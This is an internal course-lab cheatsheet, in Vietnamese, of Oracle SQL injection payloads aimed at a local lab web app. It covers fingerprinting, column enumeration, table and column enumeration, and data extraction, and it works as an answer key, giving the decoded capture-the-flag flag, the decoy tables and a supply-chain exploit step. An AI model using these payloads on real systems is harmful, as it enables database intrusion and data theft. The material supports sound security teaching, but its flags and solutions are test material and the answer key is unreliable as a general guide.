# Oracle SQL Injection Payload Cheatsheet
## OracleSecLab – Penetration Testing Reference

> ⚠️ For educational and laboratory penetration testing practice only.

---

## 1. Xác nhận Oracle Database

```sql
-- Oracle dùng DUAL table (MySQL/MSSQL không có)
' AND 1=1 AND ROWNUM=1 AND '1'='1
' UNION SELECT NULL FROM DUAL WHERE '1'='1

-- Lấy Oracle version
' UNION SELECT NULL,BANNER,NULL FROM V$VERSION WHERE ROWNUM=1 AND '1'='1

-- Lấy DB user hiện tại
' UNION SELECT NULL,USER,NULL FROM DUAL WHERE '1'='1
' UNION SELECT 1,SYS_CONTEXT('USERENV','SESSION_USER'),NULL FROM DUAL WHERE '1'='1

-- Lấy DB name
' UNION SELECT 1,ORA_DATABASE_NAME,NULL FROM DUAL WHERE '1'='1
```

---

## 2. Xác định số cột (Column Count)

```sql
-- Thêm từng NULL đến khi không lỗi
' UNION SELECT NULL FROM DUAL WHERE '1'='1
' UNION SELECT NULL,NULL FROM DUAL WHERE '1'='1
' UNION SELECT NULL,NULL,NULL FROM DUAL WHERE '1'='1   ← ứng dụng này có 3 cột ✓
```

---

## 3. Xác định kiểu dữ liệu từng cột

```sql
-- Cột 1 là NUMBER
' UNION SELECT 1,NULL,NULL FROM DUAL WHERE '1'='1

-- Cột 2 là VARCHAR2
' UNION SELECT 1,'test',NULL FROM DUAL WHERE '1'='1

-- Cột 3 là VARCHAR2
' UNION SELECT 1,'test','test2' FROM DUAL WHERE '1'='1
```

---

## 4. Enumerate Tables (Oracle Metadata)

```sql
-- Liệt kê 5 bảng đầu
' UNION SELECT ROWNUM,table_name,NULL FROM USER_TABLES WHERE ROWNUM<=5 AND '1'='1

-- Lấy bảng tiếp theo (skip các bảng đã biết)
' UNION SELECT ROWNUM,table_name,NULL FROM USER_TABLES
WHERE table_name NOT IN ('USERS','STUDENTS','COURSES','ENROLLMENTS','AUDIT_LOGS')
AND ROWNUM<=5 AND '1'='1

-- Liệt kê TẤT CẢ bảng (cần nhiều lần với NOT IN)
-- Các bảng cần tìm: FLAGS, AUDIT_LOGS, CONFIG_STORE, ADMIN_SECRETS,
--                   FAKE_FLAGS, SYSTEM_HINTS, FLAG_ARCHIVE
```

---

## 5. Enumerate Columns

```sql
-- Liệt kê cột của bảng cụ thể
' UNION SELECT 1,column_name,data_type FROM USER_TAB_COLUMNS
WHERE table_name='FLAGS' AND ROWNUM<=10 AND '1'='1

-- Cột của CONFIG_STORE (target cho Vuln 1 Part C và Vuln 3)
' UNION SELECT 1,column_name,data_type FROM USER_TAB_COLUMNS
WHERE table_name='CONFIG_STORE' AND '1'='1
```

---

## 6. Extract Data – Flag 1 (search.php SQLi)

### Part A – từ FLAGS table (hex encoded)
```sql
' UNION SELECT flag_id,flag_part,flag_code FROM FLAGS
WHERE is_active=1 AND flag_code='FL1_PART_A' AND ROWNUM=1 AND '1'='1
-- Kết quả: 4442533430317B53514C5F
-- Decode:  hex → "DBS401{SQL_"
```

### Part B – từ AUDIT_LOGS table (reversed string trong JSON)
```sql
' UNION SELECT log_id,metadata_note,action FROM AUDIT_LOGS
WHERE action='SYSTEM_AUDIT_CHECK' AND ROWNUM=1 AND '1'='1
-- Kết quả: {"fragment":"_n01tc3jn1","note":"reverse_for_context",...}
-- Decode:  reverse("_n01tc3jn1") → "1nj3ct10n_"
```

### Part C – từ CONFIG_STORE table (base64 encoded)
```sql
' UNION SELECT 1,config_value,config_key FROM CONFIG_STORE
WHERE config_key='sys_alpha_marker' AND '1'='1
-- Kết quả: MHI0Y2wzIX0=
-- Decode:  base64 → "0r4cl3!}"
```

### Ghép Flag 1
```
Part A: DBS401{SQL_
Part B: 1nj3ct10n_
Part C: 0r4cl3!}
FLAG 1 = DBS401{SQL_1nj3ct10n_0r4cl3!}
```

---

## 7. Extract Data – Vuln 3 Recon (Supply Chain)

### Tìm update_url trong CONFIG_STORE (is_public=0)
```sql
-- Liệt kê tất cả private configs
' UNION SELECT 1,config_key,config_value FROM CONFIG_STORE
WHERE is_public=0 AND ROWNUM<=5 AND '1'='1

-- Lấy update_url cụ thể
' UNION SELECT 1,config_value,config_key FROM CONFIG_STORE
WHERE config_key='update_url' AND '1'='1
-- Kết quả: http://127.0.0.1:8081/manifest.json
```

### Tìm app_version hiện tại (để biết phải fake version cao hơn bao nhiêu)
```sql
' UNION SELECT 1,config_value,config_key FROM CONFIG_STORE
WHERE config_key='app_version' AND '1'='1
-- Kết quả: 3.1.0  → manifest giả cần version > 3.1.0 (ví dụ: 9.9.9)
```

---

## 8. Decoy Table Warnings

| Bảng / Key | Loại | Nội dung |
|-----------|------|---------|
| `FLAG_ARCHIVE` | Decoy table | `DBS401{FAKE_archived_flag_123}` |
| `FAKE_FLAGS` | Decoy table | Nhiều fake flags |
| `FL_DECOY_B` trong FLAGS | Decoy row | Base64 garbage |
| `sys_beta_marker` trong CONFIG_STORE | Decoy key | Fake base64 |
| `oracle_flag_3_backup` trong ADMIN_SECRETS | Decoy key | `DBS401{FAKE_blind_wrong_key_xd}` |

---

## 9. Oracle-Specific Functions

```sql
-- Nối chuỗi (Oracle dùng || không dùng CONCAT như MySQL)
' UNION SELECT 1,'hello'||'world',NULL FROM DUAL WHERE '1'='1

-- Ký tự từ ASCII code
CHR(68) = 'D',  CHR(66) = 'B',  CHR(83) = 'S'

-- Decode hex inline (nếu có quyền UTL_RAW)
UTL_RAW.CAST_TO_VARCHAR2(HEXTORAW('4442533430317B'))  -- = 'DBS401{'

-- Thông tin hệ thống
SYS_CONTEXT('USERENV','DB_NAME')        -- tên database
SYS_CONTEXT('USERENV','SESSION_USER')   -- user hiện tại
SYS_CONTEXT('USERENV','IP_ADDRESS')     -- IP client
```

---

## 10. ROWNUM vs LIMIT

```sql
-- Oracle KHÔNG có LIMIT, dùng ROWNUM trong WHERE
-- Sai (MySQL):    SELECT * FROM USERS LIMIT 5
-- Đúng (Oracle):  SELECT * FROM USERS WHERE ROWNUM <= 5

-- Nếu cần ORDER BY + LIMIT:
SELECT * FROM (
    SELECT * FROM USERS ORDER BY user_id
) WHERE ROWNUM <= 5
```

---

## 11. Decode Steps Summary

| Chuỗi thu được | Bước decode | Kết quả |
|---------------|------------|---------|
| `4442533430317B53514C5F` | hex_decode | `DBS401{SQL_` |
| `_n01tc3jn1` | reverse | `1nj3ct10n_` |
| `MHI0Y2wzIX0=` | base64_decode | `0r4cl3!}` |
| `4442533430317b357570...` | hex_decode | `DBS401{5upp1y_Ch41n_...}` |

---

## 12. Tools (Lab)

```bash
# Decode hex
echo "4442533430317B53514C5F" | xxd -r -p

# Decode base64
echo "MHI0Y2wzIX0=" | base64 -d

# Reverse string (Python)
python3 -c "print('_n01tc3jn1'[::-1])"

# Dùng decode_helper.py
python3 tools/decode_helper.py --assemble
python3 tools/decode_helper.py --hex 4442533430317B53514C5F
python3 tools/decode_helper.py --b64 MHI0Y2wzIX0=
python3 tools/decode_helper.py --rev '_n01tc3jn1'

# Chạy exploit Supply Chain (Vuln 3)
python3 tools/exploit_flag3_local.py --host 127.0.0.1 --port 80
```

---

*DBS401 – Group 02 – Cheatsheet nội bộ – Không phát hành công khai*